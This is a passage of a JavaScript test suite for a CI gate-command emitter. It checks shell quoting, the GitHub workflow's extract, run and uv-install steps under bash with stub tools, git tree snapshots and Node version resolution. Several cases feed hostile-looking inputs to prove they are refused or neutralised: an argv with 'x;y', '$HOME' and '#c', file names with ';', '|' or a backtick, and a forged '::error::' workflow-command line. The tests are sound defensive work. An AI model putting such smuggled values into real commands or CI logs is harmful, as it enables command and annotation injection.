  // so case A asserts the quoted form. AD1 is the class check that replaces literals: every GATES and RUNNERS entry — and a synthetic hostile argv —
  // round-trips through a POSIX shlex split with and without a cwd, and every all-SAFE_TOKEN entry keeps
  // its exact bytes (quoting must not re-quote what is already one inert word).
  // The shlex round-trip is compose()'s property, NOT the consumers': the CI extraction (sed) and the
  // pre-commit hook (awk) cut every line at its first `#` — they must, to drop the emitter's
  // `# whole-program` trailer — and read commands one per line, so a `#`, CR or LF inside quotes
  // survives shlex and still breaks there (`'#c'` leaves an unbalanced `'` for `sh -c`). The synthetic
  // row proves the quoting only. What makes the consumers safe is that no composed command can carry
  // one of those characters, and AD1 asserts both halves: no GATES/RUNNERS element holds one, and
  // the token gate every repo-supplied value passes (files, cwd, script paths) refuses them.
  {
    const fails = []
    const same = isDeepStrictEqual
    const show = (v) => JSON.stringify(v)
    // POSIX `shlex.split`: whitespace separates, single quotes are literal, double quotes honour a
    // backslash before one of `"\$` and a backtick, a backslash outside quotes escapes the next character.
    // An unclosed quote throws, as `sh` would refuse the line.
    const shlexSplit = (text) => {
      const out = []
      let cur = null
      let i = 0
      while (i < text.length) {
        const ch = text[i]
        if (' \t\r\n'.includes(ch)) {
          if (cur !== null) { out.push(cur); cur = null }
          i++
          continue
        }
        if (cur === null) cur = ''
        if (ch === "'") {
          const j = text.indexOf("'", i + 1)
          if (j < 0) throw new Error('No closing quotation')
          cur += text.slice(i + 1, j)
          i = j + 1
        } else if (ch === '"') {
          i++
          for (;;) {
            if (i >= text.length) throw new Error('No closing quotation')
            if (text[i] === '"') { i++; break }
            if (text[i] === '\\' && i + 1 < text.length && '"\\$`'.includes(text[i + 1])) { cur += text[i + 1]; i += 2; continue }
            cur += text[i++]
          }
        } else if (ch === '\\') {
          if (i + 1 >= text.length) throw new Error('No escaped character')
          cur += text[i + 1]
          i += 2
        } else {
          cur += ch
          i++
        }
      }
      if (cur !== null) out.push(cur)
      return out
    }
    const entries = Object.entries(hc.GATES).map(([k, gt]) => ['GATES.' + k, [...gt.cmd]])
    entries.push(...Object.entries(hc.RUNNERS).map(([k, r]) => ['RUNNERS.' + k, [...r]]))
    entries.push(['synthetic', ['tool', 'a b', "it's", 'x;y', '$HOME', '*', '#c']])
    for (const [name, argv] of entries) {
      for (const cwd of ['', 'api']) {
        const text = hc.compose(argv, cwd)
        const want = cwd ? ['cd', cwd, '&&', ...argv] : argv
        let got
        try { got = shlexSplit(text) } catch (e) { got = `<unparseable: ${e.message}>` }   // an unquoted `'` — sh would refuse the line outright
        if (!same(got, want)) fails.push(`${name} cwd=${show(cwd)}: ${show(text)} splits to ${show(got)}`)
      }
      if (name !== 'synthetic' && argv.every((p) => hc.token_ok(p)) && hc.compose(argv, '') !== argv.join(' ')) {
        fails.push(`${name}: an all-safe argv changed bytes: ${show(hc.compose(argv, ''))}`)
      }
    }
    if (!Object.values(hc.GATES).some((gt) => !gt.cmd.every((p) => hc.token_ok(p)))) {
      fails.push('no GATES entry needs quoting any more — retarget case AD2 at one that does')
    }
    // The consumers' line parse: a comment cut at the first '#' and one command per line.
    const LINE_BREAKERS = ['#', '\r', '\n']
    for (const [name, argv] of entries) {
      if (name === 'synthetic') continue
      const bad = argv.filter((p) => LINE_BREAKERS.some((c) => p.includes(c)))
      if (bad.length) {
        fails.push(`${name}: element(s) ${show(bad)} carry '#'/CR/LF — the CI sed and pre-commit awk comment cut or line split would break the composed command`)
      }
    }
    for (const tok of ['a#b', '#c', 'a\nb', 'a\rb', 'a.py\n']) {
      if (hc.token_ok(tok)) fails.push(`token_ok accepts ${show(tok)} — a repo-supplied value could carry it to a consumer's line parse`)
      if (hc.file_arg_ok(tok)) fails.push(`file_arg_ok accepts ${show(tok)} — a changed file could carry it to a consumer's line parse`)
    }
    // ADR 0112: `( ) [ ]` widen the FILE predicate only. token_ok must keep refusing them (cwd, script
    // paths and runner elements are emitted unquoted), and a file argument carrying them round-trips.
    for (const tok of ['app/(admin)/page.ts', 'app/[id]/page.ts', '(g)/[x].py']) {
      if (hc.token_ok(tok)) fails.push(`token_ok accepts ${show(tok)} — the widening leaked into the unquoted positions (ADR 0112)`)
      if (!hc.file_arg_ok(tok)) fails.push(`file_arg_ok refuses ${show(tok)} — the dist #7 route paths are excluded again`)
      const text = hc.compose(['npx', 'eslint', tok], 'web')
      if (!same(shlexSplit(text), ['cd', 'web', '&&', 'npx', 'eslint', tok]) || !text.includes(`'${tok}'`)) {
        fails.push(`a route-path file argument does not round-trip single-quoted: ${show(text)}`)
      }
    }
    for (const tok of ['a b.ts', 'a$b.ts', 's*t.ts', 'q?.ts', '{c}.ts', '@modal/p.ts', '+page.ts', "a'b.ts",
      '../x.ts', '/abs.ts', 'a;b.ts', 'a|b.ts', 'a`b.ts']) {
      if (hc.file_arg_ok(tok)) fails.push(`file_arg_ok accepts ${show(tok)} — outside ADR 0112's ( ) [ ] widening`)
    }
    check('AD1 every GATES/RUNNERS argv (and a hostile synthetic one) round-trips through a POSIX shlex split; safe ones keep their bytes; no composed command can carry a # / CR / LF (closed set + token gate)',
      fails.length === 0, `AD-FAIL: ${fails.join(' | ')}`)
  }
  })
  section('AD2', [], async () => {
  // AD2: END TO END through the consumer that actually parses the string — the vendored CI's own
  // `Extract the gate commands` and `Run the emitted gate commands` step scripts, lifted verbatim out
  // of the template (never a transcription that could drift from it), run by bash over this
  // emitter's stdout, with a stub `uv` first on PATH that prints the argv it RECEIVED. The awk
  // runner table must still read the runner and cwd around the quoted element, and the `sh -c` in
  // the run step must hand pytest `not db` as one argument. pre-commit's awk never runs a
  // whole-program gate (it defers them), and every file-scoped GATES entry is all-safe (AD1).
  const findBash = () => {
    if (!win) return which_on_path('bash') || null
    // Git's own bash, found from the git executable — never PATH's first `bash`, which on Windows
    // can be WSL (another filesystem namespace). harness_git.mjs
    // starts the real git.exe, so walk up from the launcher until a Git root is found.
    const gitExe = which_on_path('git')
    let dir = gitExe ? path.dirname(gitExe) : ''
    for (let n = 0; n < 3 && dir && dir !== path.dirname(dir); n++) {
      for (const rel of ['usr/bin/bash.exe', 'bin/bash.exe']) {
        const cand = path.join(dir, rel)
        try { if (fs.statSync(cand).isFile()) return cand } catch { /* not this layout */ }
      }
      dir = path.dirname(dir)
    }
    return null
  }
  getRunBlock = (ls, stepName) => {
    const stepRx = new RegExp(`^\\s*- name: ${stepName.replace(/[.*+?^${}()|[\]\\]/gu, '\\$&')}\\s*$`, 'iu')
    const at = ls.findIndex((l) => stepRx.test(l))
    if (at < 0) return null
    for (let i = at + 1; i < ls.length; i++) {
      const km = /^(\s*)run: \|\s*$/iu.exec(ls[i])
      if (km) {
        const keyIndent = km[1].length
        const body = []
        for (let j = i + 1; j < ls.length; j++) {
          const l = ls[j]
          if (l.trim() && (l.length - l.trimStart().length) <= keyIndent) break
          body.push(l.length > keyIndent + 2 ? l.slice(keyIndent + 2) : '')
        }
        return `${body.join('\n')}\n`
      }
      if (/^\s*- name: /iu.test(ls[i])) return null
    }
    return null
  }
  fwd = (p) => path.resolve(p).replaceAll('\\', '/')
  // bash output, stdout and stderr joined, CRs dropped: the pipeline under test is the ubuntu one.
  runBash = (args) => {
    const r = spawnSync(bashExe, args, { encoding: 'utf8', windowsHide: true, env: childEnv({}), maxBuffer: 64 * 1024 * 1024 })
    return { Out: `${r.stdout ?? ''}${r.stderr ?? ''}`.replaceAll('\r', ''), Code: r.status }
  }
  bashExe = findBash()
  const ciTemplate = path.resolve(here, '../skills/harness-init/templates/.github/workflows/harness-gates.yml')
  ciLines = fs.readFileSync(ciTemplate, 'utf8').replaceAll('\r', '').split('\n')
  if (!bashExe) {
    if (process.env.CI) check('AD2 bash is available on CI', false, 'no bash found — the end-to-end quoting case cannot run')
    else reg('harness_gates AD2', { skip: 'no bash found (reported, not silent) — CI runs this case' }, () => {}, true)
  } else {
    const extractSh = getRunBlock(ciLines, 'Extract the gate commands and their runners')
    const runSh = getRunBlock(ciLines, 'Run the emitted gate commands')
    check('AD2 both CI step scripts are found in the template', extractSh && runSh && m(extractSh, P`cmds\.txt`) && m(runSh, P`sh -c "\$c"`), `extract=[${extractSh}] run=[${runSh}]`)
    const CFG_AD = rep(CFG, '    { "name": "web",', P`    { "name": "lib", "match": "^lib/.*\\.py$", "cwd": "", "strip_prefix": "", "gates": ["pytest-nondb"] },` + '\n    { "name": "web",')
    // `api/(g)/[id].py`: a changed FILE argument that needs quoting (ADR 0112) — the CI's sed/awk
    // extraction and `sh -c` must hand it over as one literal argument too.
    const repoAD = newRepo('ad-quoting', CFG_AD, ['api/app.py', 'lib/x.py', 'api/(g)/[id].py'])
    const adWork = path.join(fx, 'ad-work')   // outside the fixture repo: the emitter must not see it
    // The stub prints the argv it RECEIVED. It starts at column 0 so the shebang is the first line.
    put(adWork, 'stub/uv', P`#!/bin/sh
printf 'STUB uv %s ' "$(basename "$PWD")"
for a in "$@"; do printf '<%s>' "$a"; done
printf '\n'
`)
    // stdout ONLY into gates.txt, as CI's `tee` takes it; CRs dropped — Windows writes CRLF,
    // the ubuntu runner does not, and the pipeline under test is the ubuntu one.
    const adOut = runNode([gatesPath, '--repo', repoAD]).stdout.replaceAll('\r', '')
    put(adWork, 'gates.txt', adOut)
    put(adWork, 'extract.sh', extractSh ?? '')
    put(adWork, 'run.sh', runSh ?? '')
    const w = fwd(adWork)
    put(adWork, 'driver.sh', `set -e
cd '${fwd(repoAD)}'
chmod +x '${w}/stub/uv' 2>/dev/null || true
PATH="$(cd '${w}/stub' && pwd):/usr/bin:/bin:$PATH"
export PATH
export RUNNER_TEMP='${w}'
export GITHUB_OUTPUT='${w}/github_output'
: > "$GITHUB_OUTPUT"
bash '${w}/extract.sh'
RUNNERS=$(sed -n 's/^runners=//p' "$GITHUB_OUTPUT")
export RUNNERS
bash '${w}/run.sh'
`)
    const rAD2 = runBash([`${w}/driver.sh`])
    const adCmds = fs.existsSync(path.join(adWork, 'cmds.txt')) ? fs.readFileSync(path.join(adWork, 'cmds.txt'), 'utf8') : ''
    const adGho = fs.existsSync(path.join(adWork, 'github_output')) ? fs.readFileSync(path.join(adWork, 'github_output'), 'utf8') : ''
    check('AD2 the CI extraction keeps the quoted element intact in cmds.txt (trailer stripped)', m(adCmds, P`(?m)^cd api && uv run pytest -m 'not db' -q$`) && m(adCmds, P`(?m)^uv run pytest -m 'not db' -q$`), `cmds.txt=[${adCmds}] gates.txt=[${adOut}]`)
    check('AD2 the awk runner table still reads runner + cwd around the quoted element', m(adGho, P`(?m)^runners= uv $`) && m(adGho, P`(?m)^uv_dirs= \. api $`), `github_output=[${adGho}]`)
    check('AD2 the CI run step exits 0 over the extracted commands', rAD2.Code === 0, `exit=${rAD2.Code}\n${rAD2.Out}`)
    check('AD2 sh -c hands pytest `not db` as ONE argument — from the cwd group and from the root', m(rAD2.Out, 'STUB uv api <run><pytest><-m><not db><-q>') && m(rAD2.Out, 'STUB uv ad-quoting <run><pytest><-m><not db><-q>'), rAD2.Out)
    check('AD2 the file-scoped gate still receives its files as one argument each — a route-path one literally (ADR 0112)', m(rAD2.Out, P`STUB uv api <run><ruff><check><\(g\)/\[id\]\.py><app\.py>`), rAD2.Out)
    check('AD2 the route-path file argument sits quoted in cmds.txt, and the runner table is unchanged by it', m(adCmds, P`(?m)^cd api && uv run ruff check '\(g\)/\[id\]\.py' app\.py$`), `cmds.txt=[${adCmds}]`)
    check('AD2 no split element reaches the runner (the issue #6 shape: <not><db>)', nm(rAD2.Out, '<not><db>'), rAD2.Out)
  }
  })
  section('AE', [], async () => {
  // --- AE: the seeded .harness.json names every selector of the closed sets ------------------------
  // The groups comment is the only place a member reads which `gates` selectors exist.
  // Set EQUALITY, both directions: a missing selector
  // hides one, a stale one names a gate the reader would see dropped. Same for verify.runner.
  {
    const fails = []
    const seed = JSON.parse(fs.readFileSync(path.resolve(here, '../skills/harness-init/templates/harness.json'), 'utf8'))
    for (const [label, text, rx, closed] of [
      ["groups[0]['//']", seed.groups[0]['//'], /'gates' are SELECTORS: ([^.]+)\./u, hc.GATES],
      ["verify['//runner']", seed.verify['//runner'], /SELECTOR: ([^.]+)\./u, hc.RUNNERS],
    ]) {
      const mm = rx.exec(text)
      if (!mm) { fails.push(`${label}: no 'a | b | c.' selector list found`); continue }
      const listed = new Set(mm[1].split('|').map((x) => x.trim()))
      const names = new Set(Object.keys(closed))
      const missing = [...names].filter((x) => !listed.has(x)).sort()
      const stale = [...listed].filter((x) => !names.has(x)).sort()
      if (missing.length) fails.push(`${label} omits ${JSON.stringify(missing)}`)
      if (stale.length) fails.push(`${label} names ${JSON.stringify(stale)}, not in the closed set`)
    }
    g('AE the seeded groups comment lists exactly the GATES selectors, verify.runner exactly the RUNNERS', fails.length === 0, `AE-FAIL: ${fails.join(' | ')}`)
  }
  })
  section('AF', [], async () => {
  // --- AF: find_repo_root stops at the NEAREST repo boundary ---------------------------------------
  // Every CLI without --repo resolves its root through this. A two-pass form would search all
  // ancestors for .harness.json before any .git, so a nested repository with no declaration of its
  // own would attach to the OUTER repo's declaration. Markers are plain files/dirs (no git needed): a
  // `.git` FILE is what a submodule or worktree carries, so the inner one is a file on purpose.
  {
    const afRoot = path.join(fx, 'nested-root')
    for (const d of ['outer/.git', 'outer/inner/src', 'outer/sub', 'outer/decl/deep']) fs.mkdirSync(path.join(afRoot, d), { recursive: true })
    put(afRoot, 'outer/.harness.json', '{}')
    put(afRoot, 'outer/inner/.git', 'gitdir: elsewhere')
    put(afRoot, 'outer/decl/.harness.json', '{}')
    const fails = []
    const base = fs.realpathSync.native(afRoot)
    for (const [start, want] of [['outer/inner/src', 'outer/inner'],   // nested repo: its own .git wins
      ['outer/sub', 'outer'],                                          // plain subdir: the outer declaration
      ['outer/decl/deep', 'outer/decl']]) {                            // a declaration below the git root wins
      const got = hc.find_repo_root(path.join(base, start))
      if (got !== fs.realpathSync.native(path.join(base, want))) fails.push(`${start} -> ${got} (want ${want})`)
    }
    g('AF find_repo_root: a nested repo keeps its own root; a declaration below the git root still wins', fails.length === 0, `AF-FAIL: ${fails.join(' | ')}`)
  }
  })
  section('AG', [], async () => {
  // --- AG: the prepared-close snapshot (ADR 0105) — `--tree` names the worktree the gates read ------
  // A prepared close is reused only while this line is unchanged, so the two ways it can lie are the
  // cases: a CONTENT change that `git status` cannot see (a file already `M`, edited again — AG3) and
  // a snapshot that mutates what it measures (the real index staging an untracked file — AG5).
  // Each case anchors a mutation: HEAD's own tree returned (AG3/AG4), `add -u` for `add -A` (AG4), the
  // real index used in place of the copy (AG5), no flag clearing (AG9), one update-index call clearing
  // both bits (AG9's second half), a broken ref read as `none` (AG10). Not covered by a case: dropping
  // the `utimesSync` stamp of the copied index (the racy-clean mtime, see `worktree_snapshot`).
  getTreeLine = async (repo) => {
    const r = await gates(repo, ['--tree'])
    const tm = /^tree: ([0-9a-f]{40}) · HEAD ([0-9a-f]{40}|none)\s*$/mu.exec(r.Out)
    return { Out: r.Out, Code: r.Code, Ok: tm !== null, Tree: tm ? tm[1] : '', Head: tm ? tm[2] : '' }
  }
  const repoAG = newRepo('tree-snapshot', CFG, [])
  put(repoAG, '.gitignore', 'build/')
  put(repoAG, 'seed.txt', 'edit one')
  const ag1 = await getTreeLine(repoAG)
  check('AG1 --tree exits 0 with exactly the tree/HEAD line and no gate output', ag1.Code === 0 && ag1.Ok && nm(ag1.Out, '(?m)^(scope|gates|review tier):'), ag1.Out)
  const ag2 = await getTreeLine(repoAG)
  check('AG2 an unchanged worktree prints the same line twice', ag2.Ok && ag2.Tree === ag1.Tree && ag2.Head === ag1.Head, `first=${ag1.Out} second=${ag2.Out}`)
  put(repoAG, 'seed.txt', 'edit two')
  const ag3 = await getTreeLine(repoAG)
  const agDiff = gitLines(repoAG, ['diff', '--name-only', ag1.Tree, ag3.Tree])
  check('AG3 a second edit to an already-modified file changes the tree, and diffing the two trees names exactly that file',
    ag3.Ok && ag3.Tree !== ag1.Tree && ag3.Head === ag1.Head && agDiff.join(',') === 'seed.txt', `t1=${ag1.Tree} t3=${ag3.Tree} diff=[${agDiff.join(',')}]`)
  put(repoAG, 'build/out.bin', 'ignored')
  const ag4a = await getTreeLine(repoAG)
  put(repoAG, 'new.txt', 'untracked')
  const ag4b = await getTreeLine(repoAG)
  check('AG4 an ignored file leaves the tree as it was; an untracked, non-ignored file changes it',
    ag4a.Tree === ag3.Tree && ag4b.Ok && ag4b.Tree !== ag3.Tree, `t3=${ag3.Tree} ignored=${ag4a.Tree} untracked=${ag4b.Tree}`)
  const agIndex = path.join(repoAG, '.git/index')
  const hashOf = (p) => createHash('sha256').update(fs.readFileSync(p)).digest('hex')
  const hashBefore = hashOf(agIndex)
  await getTreeLine(repoAG)
  const hashAfter = hashOf(agIndex)
  const agStaged = gitLines(repoAG, ['diff', '--cached', '--name-only'])
  const agOthers = gitLines(repoAG, ['ls-files', '--others', '--exclude-standard'])
  check('AG5 the snapshot never touches the real index: same bytes, nothing staged, the new file still untracked',
    hashBefore === hashAfter && agStaged.length === 0 && agOthers.includes('new.txt'), `index same=${hashBefore === hashAfter} staged=[${agStaged.join(',')}] others=[${agOthers.join(',')}]`)
  fixtureCommit(repoAG, 'commit the prepared state')
  const ag6 = await getTreeLine(repoAG)
  check('AG6 committing the same content keeps the tree and moves HEAD, so the line differs', ag6.Ok && ag6.Tree === ag4b.Tree && ag6.Head !== ag4b.Head, `before=${ag4b.Out} after=${ag6.Out}`)
  const agBare = path.join(fx, 'tree-not-a-repo')
  fs.mkdirSync(agBare, { recursive: true })
  const ag7 = await gates(agBare, ['--tree'])
  check('AG7 outside a repository the snapshot fails loudly: marker, non-zero exit, no tree line',
    ag7.Code !== 0 && m(ag7.Out, 'tree: FAILED — the working tree could not be snapshotted') && nm(ag7.Out, 'tree: [0-9a-f]{40}'), `exit=${ag7.Code} out=${ag7.Out}`)
  const agUnborn = path.join(fx, 'tree-unborn')
  fs.mkdirSync(agUnborn, { recursive: true })
  gitq(agUnborn, ['init', '-q'])
  put(agUnborn, 'a.txt', 'a')
  const ag8 = await getTreeLine(agUnborn)
  check('AG8 an unborn HEAD is a state, not a failure: HEAD none, a tree id, exit 0', ag8.Code === 0 && ag8.Ok && ag8.Head === 'none', ag8.Out)
  })
  section('AG9', ['AG'], async () => {
  // AG9: the copied index carries assume-unchanged and skip-worktree bits,
  // and `add -A` never looks at a flagged entry, so an edit to one would leave the id unchanged while every
  // gate reads the new bytes. Each bit is its own edit here: git clears only one bit per update-index
  // call, so a one-call fix passes the first half and fails the second.
  const repoAG9 = newRepo('tree-flags', CFG, ['au.txt', 'sw.txt'])
  fixtureCommit(repoAG9, 'flag targets')
  gitq(repoAG9, ['update-index', '--assume-unchanged', 'au.txt'])
  gitq(repoAG9, ['update-index', '--skip-worktree', 'sw.txt'])
  const ag9a = await getTreeLine(repoAG9)
  put(repoAG9, 'au.txt', 'edited')
  const ag9b = await getTreeLine(repoAG9)
  put(repoAG9, 'sw.txt', 'edited')
  const ag9c = await getTreeLine(repoAG9)
  const ag9Flags = gitLines(repoAG9, ['ls-files', '-v']).join(',')
  check('AG9 an edit under assume-unchanged, then one under skip-worktree, each changes the tree; the real index keeps both bits',
    ag9a.Ok && ag9b.Ok && ag9c.Ok && ag9b.Tree !== ag9a.Tree && ag9c.Tree !== ag9b.Tree && m(ag9Flags, P`(^|,)h au\.txt`) && m(ag9Flags, P`(^|,)S sw\.txt`),
    `clean=${ag9a.Tree} au=${ag9b.Tree} sw=${ag9c.Tree} flags=[${ag9Flags}]`)
  })
  section('AG10', [], async () => {
  // AG10: only an unborn branch reads as `HEAD none`. A branch whose ref is garbage is a failure, and
  // printing `none` for it would give two broken runs a matching, false identity.
  const repoAG10 = newRepo('tree-broken-ref', CFG, [])
  const ag10Ref = gitRun(repoAG10, ['symbolic-ref', 'HEAD']).trim()
  put(repoAG10, `.git/${ag10Ref}`, 'not-a-sha')
  const ag10 = await gates(repoAG10, ['--tree'])
  check('AG10 a broken branch ref fails loudly instead of printing HEAD none', ag10.Code !== 0 && m(ag10.Out, 'tree: FAILED') && nm(ag10.Out, 'HEAD none'), `exit=${ag10.Code} out=${ag10.Out}`)
  })
  section('AH', ['AD2'], async () => {
  // --- AH: the uv install step names an unpinned interpreter (ADR 0154) ----------------------------
  // The step is extracted from the template BY NAME and run under bash with a stub `uv`, as AD2 runs
  // its neighbours. The stub records its argv and, on success, writes the `.venv/pyvenv.cfg` that the
  // step reads, with the version the case asks for. Each case anchors one mutation: AH2 fails a
  // full-version compare, AH4 a pin search that climbs above the gate directory, AH5/AH6 an error that
  // ignores the pin, AH6b/AH7b a pin trusted with no venv beside it, AH3 a lost `--locked`, AH9 a
  // reader that keeps every `version_info` line. AH0
  // fails a renamed step, so the case never runs nothing. The asserts match ASCII only: the step's Korean text
  // reaches this process through the console code page, which this suite does not pin.
  if (bashExe) {
    const ahInstall = getRunBlock(ciLines, 'Install the project with uv (once per directory the uv gates run in)')
    check('AH0 the uv install step script is found in the template', ahInstall && m(ahInstall, P`pyvenv\.cfg`) && m(ahInstall, 'uv sync --locked'), `install=[${ahInstall}]`)
    const ahWork = path.join(fx, 'ah-work')
    put(ahWork, 'stub/uv', P`#!/bin/sh
printf 'STUB uv %s' "$(basename "$PWD")"; for a in "$@"; do printf ' <%s>' "$a"; done; printf '\n'
if [ "$STUB_PY" = forge ]; then
  mkdir -p .venv
  printf 'version_info = 3.15.0\nversion_info = ::error::forged\n' > .venv/pyvenv.cfg
elif [ -n "$STUB_PY" ]; then
  mkdir -p .venv
  printf 'home = /x\nimplementation = CPython\nversion_info = %s\ninclude-system-site-packages = false\n' "$STUB_PY" > .venv/pyvenv.cfg
fi
if [ -n "$STUB_FAIL" ]; then echo 'error: stub failure' >&2; exit 2; fi
exit 0
`)
    put(ahWork, 'install.sh', ahInstall ?? '')
    const ahW = fwd(ahWork)
    // `-` stands for an empty value: an empty argument is the one shape this driver avoids.
    put(ahWork, 'driver.sh', `cd "$1"
chmod +x '${ahW}/stub/uv' 2>/dev/null || true
PATH="$(cd '${ahW}/stub' && pwd):/usr/bin:/bin:$PATH"
UV_DIRS="$2"; RUNNER_PY='3.12.13'; STUB_PY="$3"; STUB_FAIL="$4"
[ "$STUB_PY" = '-' ] && STUB_PY=''
[ "$STUB_FAIL" = '-' ] && STUB_FAIL=''
export PATH UV_DIRS RUNNER_PY STUB_PY STUB_FAIL
bash '${ahW}/install.sh'
`)
    const invokeAh = (name, files, dirs, stubPy, fail) => {
      const t = path.join(ahWork, name)
      fs.mkdirSync(t, { recursive: true })
      for (const f of files) put(t, f, '3.13\n')
      for (const d of dirs.split(' ')) fs.mkdirSync(path.join(t, d), { recursive: true })
      return runBash([`${ahW}/driver.sh`, fwd(t), dirs, stubPy, fail])
    }
    const h1 = invokeAh('unpinned-newer', [], '.', '3.15.0', '-')
    check('AH1 an unpinned directory on another minor gets a warning naming both versions and ADR 0154; the step passes',
      h1.Code === 0 && m(h1.Out, P`(?m)^::warning::uv sync \(\.\) .*CPython 3\.15\.0.*3\.12\.13.*ADR 0154`) && m(h1.Out, P`(?m)^STUB uv \S+ <sync>$`) && nm(h1.Out, '<--locked>'), `exit=${h1.Code}\n${h1.Out}`)
    const h2 = invokeAh('unpinned-same-minor', [], '.', '3.12.7', '-')
    check('AH2 an unpinned directory on the runner minor, another patch, gets no warning and one interpreter line',
      h2.Code === 0 && nm(h2.Out, '::warning::') && m(h2.Out, P`(?m)^uv interpreter \(\.\): CPython 3\.12\.7 `), `exit=${h2.Code}\n${h2.Out}`)
    const h3 = invokeAh('pinned-locked', ['.python-version', 'uv.lock'], '.', '3.13.16', '-')
    check('AH3 a pinned directory on another minor gets no warning, names its pin, and keeps --locked',
      h3.Code === 0 && nm(h3.Out, '::warning::') && m(h3.Out, P`(?m)^uv interpreter \(\.\): CPython 3\.13\.16 .*\./\.python-version`) && m(h3.Out, '<sync> <--locked>'), `exit=${h3.Code}\n${h3.Out}`)
    // AH4/AH4b/AH4c: uv reads no pin above a project root, so a pin above the gate directory must
    // not count. A search that climbs to the repo root would let a root pin hide both the warning and
    // the error of a sub-project.
    const h4 = invokeAh('pin-at-root', ['.python-version'], 'api', '3.13.16', '-')
    check('AH4 a pin above the gate directory does not count: uv ignores it, so the warning fires',
      h4.Code === 0 && m(h4.Out, P`(?m)^::warning::uv sync \(api\) .*CPython 3\.13\.16`) && nm(h4.Out, P`(?m)^uv interpreter \(api\): CPython`) && m(h4.Out, 'STUB uv api <sync>'), `exit=${h4.Code}\n${h4.Out}`)
    const h4b = invokeAh('pin-at-root-fail', ['.python-version'], 'api', '-', 'yes')
    check('AH4b a failed sync below a root pin still gets the error with the fix', h4b.Code === 2 && m(h4b.Out, P`(?m)^::error::uv sync \(api\) .*ADR 0154`), `exit=${h4b.Code}\n${h4b.Out}`)
    const h4c = invokeAh('member-venv-at-root', ['.python-version'], 'api', '-', '-')
    check('AH4c a member whose venv sits above it gets a stated skip, never a warning',
      h4c.Code === 0 && nm(h4c.Out, '::warning::') && m(h4c.Out, P`(?m)^uv interpreter \(api\): .*api/\.venv/pyvenv\.cfg`), `exit=${h4c.Code}\n${h4c.Out}`)
    const h5 = invokeAh('unpinned-fail', [], '.', '-', 'yes')
    check("AH5 a failed sync in an unpinned directory gets the error with the fix and keeps uv's exit code",
      h5.Code === 2 && m(h5.Out, P`(?m)^::error::uv sync \(\.\) .*ADR 0154`) && m(h5.Out, 'stub failure'), `exit=${h5.Code}\n${h5.Out}`)
    const h6 = invokeAh('pinned-fail', ['.python-version'], '.', '3.13.16', 'yes')
    check("AH6 a failed sync in a pinned directory that holds the venv gets no pin error and keeps uv's exit code", h6.Code === 2 && nm(h6.Out, '::error::'), `exit=${h6.Code}\n${h6.Out}`)
    // AH6b/AH7b: uv reads no pin in a workspace member, and the
    // member's venv sits at the workspace root. A pin in a directory without a venv is therefore not
    // proof that uv read it: never a "pinned" line, and a failed sync still gets the error.
    const h6b = invokeAh('member-pin-fail', ['.python-version'], '.', '-', 'yes')
    check('AH6b a failed sync where a pin has no venv beside it gets the error naming that pin', h6b.Code === 2 && m(h6b.Out, P`(?m)^::error::uv sync \(\.\) .*\./\.python-version.*ADR 0154`), `exit=${h6b.Code}\n${h6b.Out}`)
    const h7b = invokeAh('member-pin-ok', ['.python-version'], '.', '-', '-')
    check('AH7b a pin with no venv beside it is a stated skip naming the pin, never a pinned interpreter line',
      h7b.Code === 0 && nm(h7b.Out, '::warning::') && nm(h7b.Out, 'CPython') && m(h7b.Out, P`(?m)^uv interpreter \(\.\): .*\./\.venv/pyvenv\.cfg.*\./\.python-version`), `exit=${h7b.Code}\n${h7b.Out}`)
    const h7 = invokeAh('no-venv', [], '.', '-', '-')
    check('AH7 an unreadable interpreter is a stated skip, never a warning or a failure', h7.Code === 0 && nm(h7.Out, '::warning::') && m(h7.Out, P`(?m)^uv interpreter \(\.\): .*\./\.venv/pyvenv\.cfg`), `exit=${h7.Code}\n${h7.Out}`)
    const h8 = invokeAh('plural-pin', ['.python-versions'], '.', '3.14.0', '-')
    check('AH8 a .python-versions file counts as a pin', h8.Code === 0 && nm(h8.Out, '::warning::') && m(h8.Out, P`\./\.python-versions`), `exit=${h8.Code}\n${h8.Out}`)
    // AH9: the version is echoed into an annotation line, so a second `version_info` line must not
    // become a line of its own — GitHub would read `::error::forged` as a workflow command.
    const h9 = invokeAh('two-cfg-lines', [], '.', 'forge', '-')
    check('AH9 only the first version_info line, version characters only, reaches the warning',
      h9.Code === 0 && m(h9.Out, P`(?m)^::warning::uv sync \(\.\) .*CPython 3\.15\.0 `) && nm(h9.Out, '(?m)^::error::') && nm(h9.Out, 'forged'), `exit=${h9.Code}\n${h9.Out}`)
  }
  })
  section('AN', ['AD2'], async () => {
  // --- AN: the Node resolver hands setup-node the repo's own declaration (ADR 0177) ----------------
  // The step is extracted BY NAME and run under bash, as AH runs its neighbour; HARNESS_NODE names this
  // machine's node, as the CI's early setup-node step does. Each case anchors one mutation: AN2 a file output
  // with no declaration, AN3/AN5/AN9 a range counted as a choice (ADR 0178), AN4/AN5 a lookup order
  // other than setup-node's, AN6 a disagreement that still
  // picks a file, AN7 a value echoed unsanitized, AN8 a parse failure that stops the step, AN10 an
  // undeclared directory that claims the image Node while another declaration sets up Node. AN0 fails a
  // renamed step, so the cases never run nothing. Asserts match ASCII only, as AH's do.
  if (bashExe) {
    const anStep = getRunBlock(ciLines, 'Resolve the Node version the npx gate directories declare')
    check('AN0 the Node resolver step script is found in the template', anStep && m(anStep, 'GITHUB_OUTPUT') && m(anStep, 'devEngines'), `step=[${anStep}]`)
    // AN11: without check-latest, `24` resolves to the image's cached 24.x, which can fail an engines
    // floor such as >=24.22.0. Read from the setup-node step's own `with:` block, so the key elsewhere
    // in the file does not count.
    const snAt = ciLines.findIndex((l) => /^\s*- name: Setup Node \(/iu.test(l))
    const snBlock = snAt >= 0 ? ciLines.slice(snAt + 1, Math.min(snAt + 8, ciLines.length - 1) + 1).filter((l) => nm(l, P`^\s*#`)).join('\n') : ''
    check('AN11 the Setup Node step passes node-version-file from the resolver, check-latest: true and package-manager-cache: false',
      m(snBlock, 'uses: actions/setup-node@') && m(snBlock, '(?m)^\\s+check-latest: true$') && m(snBlock, '(?m)^\\s+package-manager-cache: false$') && m(snBlock, P`node-version-file: \$\{\{ steps\.node\.outputs\.file \}\}`), `block=[${snBlock}]`)
    const anWork = path.join(fx, 'an-work')
    const anNode = fwd(process.execPath)
    put(anWork, 'resolve.sh', anStep ?? '')
    const anW = fwd(anWork)
    put(anWork, 'driver.sh', `cd "$1"
PATH="/usr/bin:/bin:$PATH"
HARNESS_NODE='${anNode}'
NPX_DIRS="$2"; GITHUB_OUTPUT="$1/.gho"
: > "$GITHUB_OUTPUT"
